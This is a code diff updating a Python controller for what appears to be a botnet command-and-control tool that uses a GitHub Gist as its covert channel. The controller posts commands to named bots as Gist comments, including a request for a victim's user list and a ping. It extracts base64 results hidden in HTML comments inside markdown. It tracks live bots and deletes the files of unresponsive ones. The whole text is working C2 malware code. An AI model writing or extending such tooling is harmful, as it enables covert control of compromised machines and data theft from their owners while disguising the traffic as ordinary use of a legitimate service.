@@ -1,5 +1,6 @@
 import requests
 import os
+import re
 import commands as cmd
 import utils as u
 from time import sleep
@@ -19,6 +20,8 @@ class Controller:
 
     def run(self):
         while True:
+            print("Checking bots...")
+            print("Running bots: " + ", ".join(self.get_running_bots()))
             command = input("Enter a command: ")
             if command == cmd.COMMAND_HELP["name"]:
                 for value in cmd.COMMANDS_CONTROLLER:
@@ -34,7 +37,7 @@ class Controller:
                 if self.current_bot is None:
                     print("No bot selected")
                     continue
-                command_id = self.send_command("Could you send me list of users?")
+                command_id = self.send_command(cmd.COMMAND_USERS["command"])
                 self.listen_for_answer(command_id)
             elif command == cmd.COMMAND_EXIT["name"]:
                 print("Exiting...")
@@ -42,8 +45,10 @@ class Controller:
             else:
                 print("Unknown command")
 
-    def send_command(self, message):
-        data = {"body": (self.current_bot + " " + message)}
+    def send_command(self, message, bot_name=None):
+        if bot_name is None:
+            bot_name = self.current_bot
+        data = {"body": (bot_name + " " + message)}
         res = requests.post(self.gist_url + "/comments", json=data, headers=self.headers)
         if res.status_code != 201:
             print("Failed to send command")
@@ -58,16 +63,13 @@ class Controller:
             if self.last_tag is not None:
                 headers.update({"If-None-Match": self.last_tag})
             res = requests.get(self.gist_url + "/comments/" + command_id, headers=headers)
-            if res.status_code == 304 or not res.json()["body"].startswith("✅ "):
+            if res.status_code == 304 or not self.is_command_finished(res.json()["body"]):
                 sleep(1)
                 continue
             self.last_tag = None
             break
-        res = requests.get(self.gist_url, headers=self.headers)
-        files = res.json()["files"]
-        for key in files:
-            if key == self.current_bot + os.getenv("BOT_FILE_EXTENSION"):
-                print(u.decode_data_from_base64(u.decode_data_from_markdown(files[key]["content"])).decode("utf-8"))
+        message = re.search("<!---(.*)-->", res.json()["body"]).group(1)
+        print(u.decode_data_from_base64(u.decode_data_from_markdown(message)).decode("utf-8"))
 
     def bot_available(self, bot_name):
         res = requests.get(self.gist_url, headers=self.headers)
@@ -75,6 +77,29 @@ class Controller:
             return (bot_name + os.getenv("BOT_FILE_EXTENSION")) in res.json()["files"]
         else:
             return False
+
+    def get_running_bots(self):
+        running = []
+        res = requests.get(self.gist_url, headers=self.headers)
+        if res.status_code == 200:
+            for filename in res.json()["files"]:
+                if filename == "README.md":
+                    continue
+                bot_name = filename.replace(os.getenv("BOT_FILE_EXTENSION"), "")
+                cid = self.send_command(cmd.COMMAND_PING["command"], bot_name)
+                sleep(2)
+                res = requests.get(self.gist_url + "/comments/" + cid, headers=self.headers)
+                if not self.is_command_finished(res.json()["body"]):
+                    data = {"files": {filename: None}}
+                    res = requests.patch(self.gist_url, json=data, headers=self.headers)
+                    if res.status_code != 200:
+                        print("Could not delete file in Gist")
+                    continue
+                running.append(bot_name)
+        return running
+
+    def is_command_finished(self, body: str) -> bool:
+        return bool(re.search("✅", body))
 
 
 def main():
